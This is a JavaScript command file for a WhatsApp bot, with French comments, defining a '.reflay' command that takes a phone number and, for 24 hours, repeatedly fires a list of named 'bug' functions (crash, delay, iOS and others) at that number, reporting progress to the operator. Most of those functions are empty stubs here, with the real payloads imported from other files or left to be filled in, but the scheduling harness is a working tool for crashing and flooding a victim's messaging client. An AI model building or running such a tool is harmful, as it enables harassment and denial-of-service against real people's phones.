// 📁 ./commands/reflay.js
import { bugall } from "../bugall.js";     
import { xUi } from "../xUi.js";           

// =============================================
// DÉFINITION DES FONCTIONS DE BUG MANQUANTES
// (Remplace par tes vraies fonctions ou importe-les)
// =============================================
async function intdress(sock, target) { console.log("intdress"); }
async function iNTofmSqL(sock, target) { console.log("iNTofmSqL"); }
async function iNTxSqL(sock, target) { console.log("iNTxSqL"); }
async function dandelionlay(sock, target) { console.log("dandelionlay"); }
async function NullMemek(sock, target) { console.log("NullMemek"); }
async function gsCp(sock, target) { console.log("gsCp"); }
async function jokowi(sock, target) { console.log("jokowi"); }
async function crashnotif(sock, target) { console.log("crashnotif"); }
async function invisblekontak(sock, target) { console.log("invisblekontak"); }
async function Delaybulldor(sock, target) { console.log("Delaybulldor"); }
async function CrashSqlV2(sock, target) { console.log("CrashSqlV2"); }
async function Delaymaklo(sock, target) { console.log("Delaymaklo"); }
async function tes(sock, target) { console.log("tes"); }
async function Vsx(sock, target) { console.log("Vsx"); }
async function ZenoEphemerals(sock, target) { console.log("ZenoEphemerals"); }
async function VsxCrashDelay(sock, target) { console.log("VsxCrashDelay"); }
async function D9XDELAYV2(sock, target) { console.log("D9XDELAYV2"); }
async function Available01(sock, target) { console.log("Available01"); }
async function ofmCrashSql(sock, target) { console.log("ofmCrashSql"); }
async function blankv1(sock, target) { console.log("blankv1"); }
async function Abcefghh(sock, target) { console.log("Abcefghh"); }
async function HomoSigmaWing(sock, target) { console.log("HomoSigmaWing"); }
async function xxx(sock, target) { console.log("xxx"); }
async function HardBukQIM(sock, target) { console.log("HardBukQIM"); }
async function ofmEr(sock, target) { console.log("ofmEr"); }
async function vfz(sock, target) { console.log("vfz"); }
async function epcihDiley(sock, target) { console.log("epcihDiley"); }
async function DelaFreezCloseRelay(sock, target) { console.log("DelaFreezCloseRelay"); }
async function BetaTester(sock, target) { console.log("BetaTester"); }
async function protocolbug3(sock, target) { console.log("protocolbug3"); }
async function delayMakerInvisible(sock, target) { console.log("delayMakerInvisible"); }
async function VampBroadcast(sock, target) { console.log("VampBroadcast"); }
async function bulldozer(sock, target) { console.log("bulldozer"); }
async function CrashBeta(sock, target) { console.log("CrashBeta"); }
async function KresKontak(sock, target) { console.log("KresKontak"); }
async function AdminBokep(sock, target) { console.log("AdminBokep"); }
async function blankPACKING(sock, target) { console.log("blankPACKING"); }
async function IosInvisible(sock, target) { 
  // Fonction iOS (à compléter avec ton vrai code)
  console.log("IosInvisible");
}

// =============================================
// UTILITAIRE PAUSE
// =============================================
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// =============================================
// COMMANDE REFLAY
// =============================================
export default {
  name: "reflay",
  alias: ["reflaybug", "allbug"],
  description: "Exécute tous les bugs (carnage, group, iOS, xUi, bugall) sur un numéro pendant 24h",

  async execute(sock, msg, args, from) {
    const q = args.join(" ");
    if (!q) {
      return sock.sendMessage(from, { text: "❌ Utilisation : .reflay 237xxxxxxxx" }, { quoted: msg });
    }

    const targetNumber = q.replace(/[^0-9]/g, "");
    if (targetNumber.length < 8) {
      return sock.sendMessage(from, { text: "❌ Numéro invalide" }, { quoted: msg });
    }

    const target = targetNumber + "@s.whatsapp.net";
    const pureTarget = targetNumber;

    // ----------------- CONFIGURATION -----------------
    const batchSize = 4;          // nombre d'actions par batch
    const injectionGapMs = 100;   // pause entre chaque action dans un batch
    const intervalMs = 2000;      // pause entre deux batches
    const totalDurationMs = 24 * 60 * 60 * 1000; // 24h

    // Calcul du temps par batch et du nombre de batches
    const perBatchTimeMs = (batchSize * injectionGapMs) + intervalMs;
    let totalBatches = Math.ceil(totalDurationMs / perBatchTimeMs);
    const MAX_BATCHES = 200000;
    if (totalBatches > MAX_BATCHES) totalBatches = MAX_BATCHES;

    const updateEveryBatches = Math.max(1, Math.floor((60 * 60 * 1000) / perBatchTimeMs)); // ~1h

    // ----------------- TABLEAU DE TOUTES LES ACTIONS -----------------
    const allActions = [
      xUi,                                 // depuis xUi.js
      async (sock, target) => bugall.necroxenui(target), // adaptation de bugall
      IosInvisible,
      intdress, iNTofmSqL, iNTxSqL, dandelionlay, NullMemek,
      gsCp, jokowi, crashnotif, invisblekontak, Delaybulldor,
      CrashSqlV2, Delaymaklo, tes, Vsx, ZenoEphemerals,
      VsxCrashDelay, D9XDELAYV2, Available01, ofmCrashSql,
      blankv1, Abcefghh, HomoSigmaWing, xxx, HardBukQIM,
      ofmEr, vfz, epcihDiley, DelaFreezCloseRelay, BetaTester,
      protocolbug3, delayMakerInvisible, VampBroadcast, bulldozer,
      CrashBeta, KresKontak, AdminBokep, blankPACKING
    ];

    // ----------------- MESSAGE INITIAL -----------------
    const imageUrl = "https://files.catbox.moe/4185go.jpg";
    const debutText = `╔═══════════════════
║  🔥 REFLAY BUG - TOUS BUGS
╠═══════════════════
║ Target: wa.me/${pureTarget}
║ Status: ⏳ Lancement...
║ Actions: ${allActions.length} bugs
║ Durée: 24h (${totalBatches} batches)
╚═══════════════════`;

    await sock.sendMessage(from, { image: { url: imageUrl }, caption: debutText }, { quoted: msg });

    // ----------------- BOUCLE PRINCIPALE -----------------
    for (let batch = 0; batch < totalBatches; batch++) {
      // Exécution du batch : toutes les actions les unes après les autres
      for (let i = 0; i < allActions.length && i < batchSize; i++) {
        const action = allActions[i % allActions.length]; // rotation des actions
        try {
          await action(sock, target);
        } catch (err) {
          console.error(`Erreur action ${action.name || "?"} batch ${batch+1}:`, err.message);
        }
        await sleep(injectionGapMs);
      }

      // Envoi de progression (toutes les heures)
      if ((batch + 1) % updateEveryBatches === 0) {
        const percent = Math.min(100, Math.round(((batch + 1) * perBatchTimeMs / totalDurationMs) * 100));
        await sock.sendMessage(from, {
          text: `📊 Progression reflay : batch ${batch+1}/${totalBatches} (${percent}%) sur wa.me/${pureTarget}`
        }, { quoted: msg });
      }

      if (batch < totalBatches - 1) {
        await sleep(intervalMs);
      }
    }

    // ----------------- MESSAGE FINAL -----------------
    const finText = `╔═══════════════════
║  ✅ REFLAY BUG TERMINÉ
╠═══════════════════
║ Target: wa.me/${pureTarget}
║ Statut: 24h écoulées
║ Actions exécutées: ${totalBatches * batchSize} fois
╚═══════════════════`;

    await sock.sendMessage(from, { image: { url: imageUrl }, caption: finText }, { quoted: msg });
    console.log(`[REPLAY] Bug terminé sur ${pureTarget}`);
  }
};
